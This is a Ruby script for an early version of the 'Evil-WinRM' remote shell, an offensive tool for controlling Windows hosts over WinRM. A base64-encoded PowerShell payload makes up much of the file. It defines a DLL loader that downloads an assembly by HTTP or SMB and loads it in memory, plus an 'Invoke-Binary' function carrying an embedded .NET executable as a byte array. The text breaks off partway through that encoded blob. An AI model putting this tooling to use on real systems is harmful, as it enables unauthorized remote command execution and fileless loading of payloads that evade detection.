#!/usr/bin/ruby
# -*- encoding : utf-8 -*-
# Author: CyberVaca
# Twitter: https://twitter.com/CyberVaca_
# Based on the Alamot's original code

require 'winrm-fs'
require 'base64'
require 'readline'
require 'stringio'
require 'colorize'

# Constants
TYPE_INFO = 0
TYPE_ERROR = 1
TYPE_WARNING = 2
TYPE_DATA = 3

# Global vars
# Set this to false to disable colors
$colors_enabled = true
# Set the path for your scripts (ps1 files) and your executables (exe files)
$scripts_path = ""
$executables_path = ""

# Connection parameters, set your ip address or hostname, your user and password
conn = WinRM::Connection.new(
    endpoint: 'http://IP:5985/wsman',
    user: 'USER',
    password: 'PASSWORD',
    :no_ssl_peer_verification => true,
    # Below, config for SSL, uncomment if needed and set cert files
    # transport: :ssl,
    # client_cert: 'certnew.cer',
    # client_key: 'client.key',
)

file_manager = WinRM::FS::FileManager.new(conn)

def colorize(text, color = "default")
    colors = {"default" => "38", "blue" => "34", "red" => "31", "yellow" => "1;33", "magenta" => "35"}
    color_code = colors[color]
    return "\033[0;#{color_code}m#{text}\033[0m"
end

def print_message(msg, msg_type)
    if msg_type == TYPE_INFO then
        msg_prefix = "Info: "
        color = "blue"
    elsif msg_type == TYPE_WARNING then
        msg_prefix = "Warning: "
        color = "yellow"
    elsif msg_type == TYPE_ERROR then
        msg_prefix = "Error: "
        color = "red"
    elsif msg_type == TYPE_DATA then
        msg_prefix = "Data: "
        color = 'magenta'
    else
        msg_prefix = "Error"
        color = "red"
    end

    if $colors_enabled then
        puts("#{colorize(msg_prefix + msg, color)}")
    else
        puts(msg_prefix + msg)
    end
    puts()
end

def check_directories(path, purpose)
    if path == "" then
        print_message("The directory used for " + purpose + " can't be empty. Please edit the script and set a path", TYPE_ERROR)
        custom_exit(1)
    end

    if (/cygwin|mswin|mingw|bccwin|wince|emx/ =~ RUBY_PLATFORM) != nil then
        # Windows
        if path[-1] != "\\" then
            path.concat("\\")
        end
    else
        # Unix
        if path[-1] != "/" then
            path.concat("/")
        end
    end

    if !File.directory?(path) then
        print_message("The directory \"" + path + "\" used for " + purpose + " was not found", TYPE_ERROR)
        custom_exit(1)
    end

    if purpose == "scripts" then
        $scripts_path = path
    elsif purpose == "executables" then
        $executables_path = path
    end
end

def silent_warnings
    old_stderr = $stderr
    $stderr = StringIO.new
    yield
ensure
    $stderr = old_stderr
end

def read_scripts(scripts)
    files = Dir.entries(scripts).select{ |f| File.file? File.join(scripts, f) }
    return files
end

def read_executables(args)
    executables = args
    files = Dir.glob("#{executables}*.exe", File::FNM_DOTMATCH)
    return files
end

def paths(directory)
    files = Dir.glob("#{directory}*.*", File::FNM_DOTMATCH)
    directories = Dir.glob("#{directory}*").select {|f| File.directory? f}
    return files + directories
end

def custom_exit(exit_code = 0)
    if exit_code == 0 then
        puts()
        print_message("Exiting with code " + exit_code.to_s, TYPE_INFO)
    elsif exit_code == 1 then
        print_message("Exiting with code " + exit_code.to_s, TYPE_ERROR)
    else
        print_message("Exiting with code " + exit_code.to_s, TYPE_ERROR)
    end
    exit(exit_code)
end

puts()
print_message("Starting Evil-WinRM shell", TYPE_INFO)
check_directories($scripts_path, "scripts")
check_directories($executables_path, "executables")
functions = read_scripts($scripts_path)
executables = read_executables(executables)
menu = Base64.decode64("JG1lbnUgPSBAIgoKICAgX19fIF9fIF9fICBfX19fICBfICAgICAgICAgICAgICAgICAgCiAgLyAgX10gIHwgIHx8ICAgIHx8IHwgICAgICAgICAgICAgICAgIAogLyAgW198ICB8ICB8IHwgIHwgfCB8ICAgICAgICAgICAgICAgICAKfCAgICBfXSAgfCAgfCB8ICB8IHwgfF9fXyAgICAgICAgICAgICAgCnwgICBbX3wgIDogIHwgfCAgfCB8ICAgICB8ICAgICAgICAgICAgIAp8ICAgICB8XCAgIC8gIHwgIHwgfCAgICAgfCAgICAgICAgICAgICAKfF9fX19ffCBcXy8gIHxfX19ffHxfX19fX3wgICAgICAgICAgICAgCiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAogX18gICAgX18gIF9fX18gIF9fX18gICBfX19fICAgX19fIF9fXyAKfCAgfF9ffCAgfHwgICAgfHwgICAgXCB8ICAgIFwgfCAgIHwgICB8CnwgIHwgIHwgIHwgfCAgfCB8ICBfICB8fCAgRCAgKXwgXyAgIF8gfAp8ICB8ICB8ICB8IHwgIHwgfCAgfCAgfHwgICAgLyB8ICBcXy8gIHwKfCAgYGAgICcgIHwgfCAgfCB8ICB8ICB8fCAgICBcIHwgICB8ICAgfAogXCAgICAgIC8gIHwgIHwgfCAgfCAgfHwgIC4gIFx8ICAgfCAgIHwKICBcXy9cXy8gIHxfX19ffHxfX3xfX3x8X198XF98fF9fX3xfX198CiAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgIAoKICAgICAgICAgICAgICAgICAgICAgICAgICAgQnk6IEN5YmVyVmFjYUBIYWNrUGxheWVycwoKIkAKaWYgKCRmdW5jaW9uZXNfcHJldmlhcy5jb3VudCAtbGUgMSkgeyRmdW5jaW9uZXNfcHJldmlhcyA9IChscyBmdW5jdGlvbjopLk5hbWV9CgpmdW5jdGlvbiBsMDRkM3ItTG9hZERsbCB7CiAgICBwYXJhbShbc3dpdGNoXSRzbWIsIFtzd2l0Y2hdJGxvY2FsLCBbc3dpdGNoXSRodHRwLCBbc3RyaW5nXSRwYXRoKQoKICAgICRoZWxwPUAiCi5TWU5PUFNJUwogICAgZGxsIGxvYWRlci4KICAgIFBvd2VyU2hlbGwgRnVuY3Rpb246IGwwNGQzci1Mb2FkRGxsCiAgICBBdXRob3I6IEjDqWN0b3IgZGUgQXJtYXMgKDN2NFNpME4pCgogICAgRGVwZW5kZW5jaWFzIFJlcXVlcmlkYXM6IE5pbmd1bmEKICAgIERlcGVuZGVuY2lhcyBPcGNpb25hbGVzOiBOaW5ndW5hCi5ERVNDUklQVElPTgogICAgLgouRVhBTVBMRQogICAgbDA0ZDNyLUxvYWREbGwgLXNtYiAtcGF0aCBcXDE5Mi4xNjguMTM5LjEzMlxcc2hhcmVcXG15RGxsLmRsbAogICAgbDA0ZDNyLUxvYWREbGwgLWxvY2FsIC1wYXRoIEM6XFVzZXJzXFBlcGl0b1xEZXNrdG9wXG15RGxsLmRsbAogICAgbDA0ZDNyLUxvYWREbGwgLWh0dHAgLXBhdGggaHR0cDovL2V4YW1wbGUuY29tL215RGxsLmRsbAoKICAgIERlc2NyaXBjaW9uCiAgICAtLS0tLS0tLS0tLQogICAgRnVuY3Rpb24gdGhhdCBsb2FkIGEgYXJiaXRyYXJ5IGRsbAoiQAoKICAgIGlmICgoJHNtYiAtZXEgJGZhbHNlIC1hbmQgJGxvY2FsIC1lcSAkZmFsc2UgLWFuZCAkaHR0cCAtZXEgJGZhbHNlKSAtb3IgKCRwYXRoIC1lcSAiIiAtb3IgJHBhdGggLWVxICRudWxsKSkKICAgIHsKICAgICAgICB3cml0ZS1ob3N0ICIkaGVscGBuIgogICAgfQogICAgZWxzZQogICAgewoKICAgICAgICBpZiAoJGh0dHApCiAgICAgICAgewogICAgICAgICAgICBXcml0ZS1Ib3N0ICJbK10gUmVhZGluZyBkbGwgYnkgSFRUUCIKICAgICAgICAgICAgJHdlYmNsaWVudCA9IFtTeXN0ZW0uTmV0LldlYkNsaWVudF06Om5ldygpCiAgICAgICAgICAgICRkbGwgPSAkd2ViY2xpZW50LkRvd25sb2FkRGF0YSgkcGF0aCkKICAgICAgICB9CiAgICAgICAgZWxzZQogICAgICAgIHsKICAgICAgICAgICAgaWYoJHNtYil7IFdyaXRlLUhvc3QgIlsrXSBSZWFkaW5nIGRsbCBieSBTTUIiIH0KICAgICAgICAgICAgZWxzZSB7IFdyaXRlLUhvc3QgIlsrXSBSZWFkaW5nIGRsbCBsb2NhbGx5IiB9CgogICAgICAgICAgICAkZGxsID0gW1N5c3RlbS5JTy5GaWxlXTo6UmVhZEFsbEJ5dGVzKCRwYXRoKQogICAgICAgIH0KICAgICAgICAKCiAgICAgICAgaWYgKCRkbGwgLW5lICRudWxsKQogICAgICAgIHsKICAgICAgICAgICAgV3JpdGUtSG9zdCAiWytdIExvYWRpbmcgZGxsLi4uIgogICAgICAgICAgICBbU3lzdGVtLlJlZmxlY3Rpb24uQXNzZW1ibHldOjpMb2FkKCRkbGwpCiAgICAgICAgfQogICAgfQp9CmZ1bmN0aW9uIG1lbnUgewpbYXJyYXldJGZ1bmNpb25lc19udWV2YXMgPSAobHMgZnVuY3Rpb246IHwgV2hlcmUtT2JqZWN0IHsoJF8ubmFtZSkuTGVuZ3RoIC1nZSAiNCIgLWFuZCAkXy5uYW1lIC1ub3RsaWtlICJDbGVhci1Ib3N0KiIgLWFuZCAkXy5uYW1lIC1ub3RsaWtlICJDb252ZXJ0RnJvbS1TZGRsU3RyaW5nIiAtYW5kICRfLm5hbWUgLW5vdGxpa2UgIkZvcm1hdC1IZXgiIC1hbmQgJF8ubmFtZSAtbm90bGlrZSAiR2V0LUZpbGVIYXNoKiIgLWFuZCAkXy5uYW1lIC1ub3RsaWtlICJHZXQtVmVyYioiIC1hbmQgJF8ubmFtZSAtbm90bGlrZSAiaGVscCIgLWFuZCAkXy5uYW1lIC1uZSAiSW1wb3J0LVBvd2VyU2hlbGxEYXRhRmlsZSIgLWFuZCAkXy5uYW1lIC1uZSAiSW1wb3J0U3lzdGVtTW9kdWxlcyIgLWFuZCAkXy5uYW1lIC1uZSAiTWFpbiIgLWFuZCAkXy5uYW1lIC1uZSAibWtkaXIiIC1hbmQgJF8ubmFtZSAtbmUgImNkLi4iIC1hbmQgJF8ubmFtZSAtbmUgIm1rZGlyIiAtYW5kICRfLm5hbWUgLW5lICJtb3JlIiAtYW5kICRfLm5hbWUgLW5lICJOZXctR3VpZCIgLWFuZCAkXy5uYW1lIC1uZSAiTmV3LVRlbXBvcmFyeUZpbGUiIC1hbmQgJF8ubmFtZSAtbmUgIlBhdXNlIiAtYW5kICRfLm5hbWUgLW5lICJUYWJFeHBhbnNpb24yIiAtYW5kICRfLm5hbWUgLW5lICJwcm9tcHQiIC1hbmQgJF8ubmFtZSAtbmUgIm1lbnUiIC1hbmQgJF8ubmFtZSAtbmUgImF1dG8iIH0gfCBzZWxlY3Qtb2JqZWN0IG5hbWUgKS5uYW1lCiRtdWVzdHJhX2Z1bmNpb25lcyA9ICgkZnVuY2lvbmVzX251ZXZhcyB8IHdoZXJlIHskZnVuY2lvbmVzX3ByZWNhcmdhZGFzIC1ub3Rjb250YWlucyAkX30pIHwgZm9yZWFjaCB7ImBuWytdICRfIn0KJG11ZXN0cmFfZnVuY2lvbmVzID0gJG11ZXN0cmFfZnVuY2lvbmVzIC1yZXBsYWNlICIgICIsIiIgCiRtZW51ID0gJG1lbnUgKyAkbXVlc3RyYV9mdW5jaW9uZXMgKyAiYG4iCiRtZW51ID0gJG1lbnUgLXJlcGxhY2UgIiBbK10iLCJbK10iCldyaXRlLUhvc3QgJG1lbnUKCn0KZnVuY3Rpb24gYXV0byB7ClthcnJheV0kZnVuY2lvbmVzX251ZXZhcyA9IChscyBmdW5jdGlvbjogfCBXaGVyZS1PYmplY3QgeygkXy5uYW1lKS5MZW5ndGggLWdlICI0IiAtYW5kICRfLm5hbWUgLW5vdGxpa2UgIkNsZWFyLUhvc3QqIiAtYW5kICRfLm5hbWUgLW5vdGxpa2UgIkNvbnZlcnRGcm9tLVNkZGxTdHJpbmciIC1hbmQgJF8ubmFtZSAtbm90bGlrZSAiRm9ybWF0LUhleCIgLWFuZCAkXy5uYW1lIC1ub3RsaWtlICJHZXQtRmlsZUhhc2gqIiAtYW5kICRfLm5hbWUgLW5vdGxpa2UgIkdldC1WZXJiKiIgLWFuZCAkXy5uYW1lIC1ub3RsaWtlICJoZWxwIiAtYW5kICRfLm5hbWUgLW5lICJJbXBvcnQtUG93ZXJTaGVsbERhdGFGaWxlIiAtYW5kICRfLm5hbWUgLW5lICJJbXBvcnRTeXN0ZW1Nb2R1bGVzIiAtYW5kICRfLm5hbWUgLW5lICJNYWluIiAtYW5kICRfLm5hbWUgLW5lICJta2RpciIgLWFuZCAkXy5uYW1lIC1uZSAiY2QuLiIgLWFuZCAkXy5uYW1lIC1uZSAibWtkaXIiIC1hbmQgJF8ubmFtZSAtbmUgIm1vcmUiIC1hbmQgJF8ubmFtZSAtbmUgIk5ldy1HdWlkIiAtYW5kICRfLm5hbWUgLW5lICJOZXctVGVtcG9yYXJ5RmlsZSIgLWFuZCAkXy5uYW1lIC1uZSAiUGF1c2UiIC1hbmQgJF8ubmFtZSAtbmUgIlRhYkV4cGFuc2lvbjIiIC1hbmQgJF8ubmFtZSAtbmUgInByb21wdCIgLWFuZCAkXy5uYW1lIC1uZSAibWVudSIgfSB8IHNlbGVjdC1vYmplY3QgbmFtZSApLm5hbWUKJG11ZXN0cmFfZnVuY2lvbmVzID0gKCRmdW5jaW9uZXNfbnVldmFzIHwgd2hlcmUgeyRmdW5jaW9uZXNfcHJlY2FyZ2FkYXMgLW5vdGNvbnRhaW5zICRffSkgfCBmb3JlYWNoIHsiJF9gbiJ9CiRtdWVzdHJhX2Z1bmNpb25lcyA9ICRtdWVzdHJhX2Z1bmNpb25lcyAtcmVwbGFjZSAiICAiLCIiIAokbXVlc3RyYV9mdW5jaW9uZXMKCgp9CgpmdW5jdGlvbiBJbnZva2UtQmluYXJ5IHtwYXJhbShbYXJyYXldJGFyZ3VtZW50b3MpCmlmICgkYXJndW1lbnRvcyAtZXEgJG51bGwpIHticmVha30KW1JlZmxlY3Rpb24uQXNzZW1ibHldOjpMb2FkKFtieXRlW11dQCg3NywgOTAsIDE0NCwgMCwgMywgMCwgMCwgMCwgNCwgMCwgMCwgMCwgMjU1LCAyNTUsIDAsIDAsIDE4NCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgNjQsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDEyOCwgMCwgMCwgMCwgMTQsIDMxLCAxODYsIDE0LCAwLCAxODAsIDksIDIwNSwgMzMsIDE4NCwgMSwgNzYsIDIwNSwgMzMsIDg0LCAxMDQsIDEwNSwgMTE1LCAzMiwgMTEyLCAxMTQsIDExMSwgMTAzLCAxMTQsIDk3LCAxMDksIDMyLCA5OSwgOTcsIDExMCwgMTEwLCAxMTEsIDExNiwgMzIsIDk4LCAxMDEsIDMyLCAxMTQsIDExNywgMTEwLCAzMiwgMTA1LCAxMTAsIDMyLCA2OCwgNzksIDgzLCAzMiwgMTA5LCAxMTEsIDEwMCwgMTAxLCA0NiwgMTMsIDEzLCAxMCwgMzYsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDgwLCA2OSwgMCwgMCwgNzYsIDEsIDMsIDAsIDI0NSwgMTgyLCAyMzEsIDkyLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAyMjQsIDAsIDIsIDMzLCAxMSwgMSwgMTEsIDAsIDAsIDEwLCAwLCAwLCAwLCA2LCAwLCAwLCAwLCAwLCAwLCAwLCA5NCwgNDEsIDAsIDAsIDAsIDMyLCAwLCAwLCAwLCA2NCwgMCwgMCwgMCwgMCwgMCwgMTYsIDAsIDMyLCAwLCAwLCAwLCAyLCAwLCAwLCA0LCAwLCAwLCAwLCAwLCAwLCAwLCAwLCA2LCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAxMjgsIDAsIDAsIDAsIDIsIDAsIDAsIDAsIDAsIDAsIDAsIDMsIDAsIDk2LCAxMzMsIDAsIDAsIDE2LCAwLCAwLCAxNiwgMCwgMCwgMCwgMCwgMTYsIDAsIDAsIDE2LCAwLCAwLCAwLCAwLCAwLCAwLCAxNiwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMTIsIDQxLCAwLCAwLCA3OSwgMCwgMCwgMCwgMCwgNjQsIDAsIDAsIDQwLCAzLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCA5NiwgMCwgMCwgMTIsIDAsIDAsIDAsIDIxMiwgMzksIDAsIDAsIDI4LCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAzMiwgMCwgMCwgOCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgOCwgMzIsIDAsIDAsIDcyLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCA0NiwgMTE2LCAxMDEsIDEyMCwgMTE2LCAwLCAwLCAwLCAxMDAsIDksIDAsIDAsIDAsIDMyLCAwLCAwLCAwLCAxMCwgMCwgMCwgMCwgMiwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMzIsIDAsIDAsIDk2LCA0NiwgMTE0LCAxMTUsIDExNCwgOTksIDAsIDAsIDAsIDQwLCAzLCAwLCAwLCAwLCA2NCwgMCwgMCwgMCwgNCwgMCwgMCwgMCwgMTIsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDY0LCAwLCAwLCA2NCwgNDYsIDExNCwgMTAxLCAxMDgsIDExMSwgOTksIDAsIDAsIDEyLCAwLCAwLCAwLCAwLCA5NiwgMCwgMCwgMCwgMiwgMCwgMCwgMCwgMTYsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDY0LCAwLCAwLCA2NiwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgNjQsIDQxLCAwLCAwLCAwLCAwLCAwLCAwLCA3MiwgMCwgMCwgMCwgMiwgMCwgNSwgMCwgMTk2LCAzMiwgMCwgMCwgMTYsIDcsIDAsIDAsIDEsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDAsIDE5LCA0OCwgNiwgMCwgMTA0LCAwLCAwLCAwLCAxLCAwLCAwLCAxNywgMCwgMTE1LCAxNSwgMCwgMCwgMTAsIDEwLCA2LCA0MCwgMTYsIDAsIDAsIDEwLCAwLCA2LCA0MCwgMTcsIDAsIDAsIDEwLCAwLCAyLCAyMiwgMTU0LCAxMTEsIDE4LCAwLCAwLCAxMCwgMTEsIDcsIDQwLCAxOSwgMCwgMCwgMTAsIDEyLCA4LCA0MCwgMjAsIDAsIDAsIDEwLCAxMywgOSwgMTExLCAyMSwgMCwgMCwgMTAsIDE5LCA0LCAxNywgNCwgMjAsIDIzLCAxNDEsIDEsIDAsIDAsIDEsIDE5LCA3LCAxNywgNywgMjIsIDIsIDIzLCA0MCwgMSwgMCwgMCwgNDMsIDQwLCAyLCAwLCAwLCA0MywgMTYyLCAxNywgNywgMTExLCAyNCwgMCwgMCwgMTAsIDM4LCA2LCAxMTEsIDE4LCAwLCAwLCAxMCwgMTksIDUsIDE3LCA1LCAxOSwgNiwgNDMsIDAsIDE3LCA2LCA0MiwgNjYsIDgzLCA3NCwgNjYsIDEsIDAsIDEsIDAsIDAsIDAsIDAsIDAsIDEyLCAwLCAwLCAwLCAxMTgsIDUyLCA0NiwgNDgsIDQ2LCA1MSwgNDgsIDUxLCA0OSwgNTcsIDAsIDAsIDAsIDAsIDUsIDAsIDEwOCwgMCwgMCwgMCwgNTYsIDIsIDAsIDAsIDM1LCAxMjYsIDAsIDAsIDE2NCwgMiwgMCwgMCwgNjgsIDMsIDAsIDAsIDM1LCA4MywgMTE2LCAxMTQsIDEwNSwgMTEwLCAxMDMsIDExNSwgMCwgMCwgMCwgMCwgMjMyLCA1LCAwLCAwLCA4LCAwLCAwLCAwLCAzNSwgODUsIDgzLCAwLCAyNDAsIDUsIDAsIDAsIDE2LCAwLCAwLCAwLCAzNSwgNzEsIDg1LCA3MywgNjgsIDAsIDAsIDAsIDAsIDYsIDAsIDAsIDE2LCAxLCAwLCAwLCAzNSwgNjYsIDEwOCwgMTExLCA5OCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMiwgMCwgMCwgMSwgNzEsIDIxLCAyLCAwLCA5LCA4LCAwLCAwLCAwLCAyNTAsIDM3LCA1MSwgMCwgMjIsIDAsIDAsIDEsIDAsIDAsIDAsIDI1LCAwLCAwLCAwLCAyLCAwLCAwLCAwLCAxLCAwLCAwLCAwLCAxLCAwLCAwLCAwLCAyNCwgMCwgMCwgMCwgMTIsIDAsIDAsIDAsIDEsIDAsIDAsIDAsIDEsIDAsIDAsIDAsIDIsIDAsIDAsIDAsIDIsIDAsIDAsIDAsIDAsIDAsIDEwLCAwLCAxLCAwLCAwLCAwLCAwLCAwLCA2LCAwLCA1NSwgMCwgNDgsIDAsIDYsIDAsIDEwMSwgMCwgNzUsIDAsIDYsIDAsIDE1MCwgMCwgMTMyLCAwLCA2LCAwLCAxNzMsIDAsIDEzMiwgMCwgNiwgMCwgMjAyLCAwLCAxMzIsIDAsIDYsIDAsIDIzMywgMCwgMTMyLCAwLCA2LCAwLCAyLCAxLCAxMzIsIDAsIDYsIDAsIDI3LCAxLCAxMzIsIDAsIDYsIDAsIDU0LCAxLCAxMzIsIDAsIDYsIDAsIDgxLCAxLCAxMzIsIDAsIDYsIDAsIDEzNywgMSwgMTA2LCAxLCA2LCAwLCAxNTcsIDEsIDEzMiwgMCwgNiwgMCwgMjAxLCAxLCAxODIsIDEsIDU1LCAwLCAyMjEsIDEsIDAsIDAsIDYsIDAsIDEyLCAyLCAyMzYsIDEsIDYsIDAsIDQ0LCAyLCAyMzYsIDEsIDYsIDAsIDkyLCAyLCA4MiwgMiwgNiwgMCwgMTA1LCAyLCA0OCwgMCwgNiwgMCwgMTEzLCAyLCA4MiwgMiwgNiwgMCwgMTQ5LCAyLCA0OCwgMCwgNiwgMCwgMTc0LCAyLCAxMzIsIDAsIDYsIDAsIDE4OCwgMiwgMTMyLCAwLCAxMCwgMCwgMjM4LCAyLCAyMjYsIDIsIDYsIDAsIDIwLCAzLCAyNDksIDIsIDYsIDAsIDQ3LCAzLCAxMzIsIDAsIDAsIDAsIDAsIDAsIDEsIDAsIDAsIDAsIDAsIDAsIDEsIDAsIDEsIDAsIDEyOSwgMSwgMTYsIDAsIDIyLCAwLCAzMSwgMCwgNSwgMCwgMSwgMCwgMSwgMCwgODAsIDMyLCAwLCAwLCAwLCAwLCAxNTAsIDAsIDYyLCAwLCAxMCwgMCwgMSwgMCwgMCwgMCwgMSwgMCwgNzAsIDAsIDE3LCAwLCAxMjYsIDAsIDE2LCAwLCAyNSwgMCwgMTI2LCAwLCAxNiwgMCwgMzMsIDAsIDEyNiwgMCwgMTYsIDAsIDQxLCAwLCAxMjYsIDAsIDE2LCAwLCA0OSwgMCwgMTI2LCAwLCAxNiwgMCwgNTcsIDAsIDEyNiwgMCwgMTYsIDAsIDY1LCAwLCAxMjYsIDAsIDE2LCAwLCA3MywgMCwgMTI2LCAwLCAxNiwgMCwgODEsIDAsIDEyNiwgMCwgMTYsIDAsIDg5LCAwLCAxMjYsIDAsIDIxLCAwLCA5NywgMCwgMTI2LCAwLCAxNiwgMCwgMTA1LCAwLCAxMjYsIDAsIDI2LCAwLCAxMjEsIDAsIDEyNiwgMCwgMzIsIDAsIDEyOSwgMCwgMTI2LCAwLCAzNywgMCwgMTM3LCAwLCAxMjYsIDAsIDM3LCAwLCAxNDUsIDAsIDEyNCwgMiwgNDEsIDAsIDE0NSwgMCwgMTMxLCAyLCA0MSwgMCwgOSwgMCwgMTQwLCAyLCA0NywgMCwgMTYxLCAwLCAxNTcsIDIsIDUxLCAwLCAxNjksIDAsIDE4MywgMiwgNTcsIDAsIDE2OSwgMCwgMTk5LCAyLCA2NCwgMCwgMTg1LCAwLCAzNCwgMywgNjksIDAsIDE4NSwgMCwgMzksIDMsIDkwLCAwLCAyMDEsIDAsIDU4LCAzLCAxMDMsIDAsIDQ2LCAwLCAxMSwgMCwgMTI2LCAwLCA0NiwgMCwgMTksIDAsIDE4MiwgMCwgNDYsIDAsIDI3LCAwLCAxOTUsIDAsIDQ2LCAwLCAzNSwgMCwgMTk1LCAwLCA0NiwgMCwgNDMsIDAsIDE5NSwgMCwgNDYsIDAsIDUxLCAwLCAxODIsIDAsIDQ2LCAwLCA1OSwgMCwgMjAxLCAwLCA0NiwgMCwgNjcsIDAsIDE5NSwgMCwgNDYsIDAsIDgzLCAwLCAxOTUsIDAsIDQ2LCAwLCA5OSwgMCwgMjIxLCAwLCA0NiwgMCwgMTA3LCAwLCAyMzAsIDAsIDQ2LCAwLCAxMTUsIDAsIDIzOSwgMCwgMTEwLCAwLCA0LCAxMjgsIDAsIDAsIDEsIDAsIDAsIDAsIDE3MSwgMjcsIDEzMCwgNzIsIDAsIDAsIDAsIDAsIDAsIDAsIDc0LCAyLCAwLCAwLCA0LCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAwLCAxLCAwLCAzOSwgMCwgMCwgMCwgMCwgMCwgNCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMCwgMSwgMCwgMjE0LCAyLCAwLCAwLCAwLCAwLCA0NSwgMCwgODYsIDAsIDQ3LCAwLCA4NiwgMCwgMCwgMCwgMCwgMCwgMCwgNjAsIDc3LCAxMTEsIDEwMCwgMTE3LCAxMDgsIDEwMSwgNjIsIDAsIDk5LCA5NywgOTgsIDEwMSwgMTE1LCAxMDQsIDk3LCA0NiwgMTAwLCAxMDgsIDEwOCwgMCwgNzMsIDExMCwgMTA2LCAxMDEsIDk5LCAxMTYsIDExMSwgMTE0LCAwLCA2NywgOTcsIDk4LCAxMDEsIDExNSwgMTA0LCA5NywgMCwgMTA5LCAxMTUsIDk5LCAxMTEsIDExNCwgMTA4LCAxMDUsIDk4LCAwLCA4MywgMTIxLCAxMTUsIDExNiwgMTAxLCAxMDksIDAsIDc5LCA5OCwgMTA2LCAxMDEsIDk5LCAxMTYsIDAsIDY5LCAxMjAsIDEwMSwgOTksIDExNywgMTE2LCAxMDEsIDAsIDk3LCAxMTQsIDEwMywgMTE1LCAwLCA4MywgMTIxLCAxMTUsIDExNiwgMTAxLCAxMDksIDQ2LCA4MiwgMTE3LCAxMTAsIDExNiwgMTA1LCAxMDksIDEwMSwgNDYsIDg2LCAxMDEsIDExNCwgMTE1LCAxMDUsIDExMSwgMTEwLCAxMDUsIDExMCwgMTAzLCAwLCA4NCwgOTcsIDExNCwgMTAzLCAxMDEsIDExNiwgNzAsIDExNCwgOTcsIDEwOSwgMTAxLCAxMTksIDExMSwgMTE0LCAxMDcsIDY1LCAxMTYsIDExNiwgMTE0LCAxMDUsIDk4LCAxMTcsIDExNiwgMTAxLCAwLCA0NiwgOTksIDExNiwgMTExLCAxMTQsIDAsIDgzLCAxMjEsIDExNSwgMTE2LCAxMDEsIDEwOSwgNDYsIDgyLCAxMDEsIDEwMiwgMTA4LCAxMDEsIDk5LCAxMTYsIDEwNSwgMTExLCAxMTAsIDAsIDY1LCAxMTUsIDExNSwgMTAxLCAxMDksIDk4LCAxMDgsIDEyMSwgODQsIDEwNSwgMTE2LCAxMDgsIDEwMSwgNjUsIDExNiwgMTE2LCAxMTQsIDEwNSwgOTgsIDExNywgMTE2LCAxMDEsIDAsIDY1LCAxMTUsIDExNSwgMTAxLCAxMDksIDk4LCAxMDgsIDEyMSwgNjgsIDEwMSwgMTE1LCA5OSwgMTE0LCAxMDUsIDExMiwgMTE2LCAxMDUsIDExMSwgMTEwLCA2NSwgMTE2LCAxMTYsIDExNCwgMTA1LCA5OCwgMTE3LCAxMTYsIDEwMSwgMCwgNjUsIDExNSwgMTE1LCAxMDEsIDEwOSwgOTgsIDEwOCwgMTIxLCA2NywgMTExLCAxMTAsIDEwMiwgMTA1LCAxMDMsIDExNywgMTE0LCA5NywgMTE2LCAxMDUsIDExMSwgMTEwLCA2NSwgMTE2LCAxMTYsIDExNCwgMTA1LCA5OCwgMTE3LCAxMTYsIDEwMSwgMCwgNjUsIDExNSwgMTE1LCAxMDEsIDEwOSwgOTgsIDEwOCwgMTIxLCA2NywgMTExLCAxMDksIDExMiwgOTcsIDExMCwgMTIxLCA2NSwgMTE2LCAxMTYsIDExNCwgMTA1LCA5OCwgMTE3LCAxMTYsIDEwMSwgMCwgNjUsIDExNSwgMTE1LCAxMDEsIDEwOSwgOTgsIDEwOCwgMTIxLCA4MCwgMTE0LCAxMTEsIDEwMCwgMTE3LCA5OSwgMTE2LCA2NSwgMTE2LCAxMTYsIDExNCwgMTA1LCA5OCwgMTE3LCAxMTYsIDEwMSwgMCwgNjUsIDExNSwgMTE1LCAxMDEsIDEwOSwgOTgsIDEwOCwgMTIxLCA2NywgMTExLCAxMTIsIDEyMSwgMTE0LCAxMDUsIDEwMywgMTA0LCAxMTYsIDY1LCAxMTYsIDExNiwgMTE0LCAxMDUsIDk4LCAxMTcsIDExNiwgMTAxLCAwLCA2NSwgMTE1LCAxMTU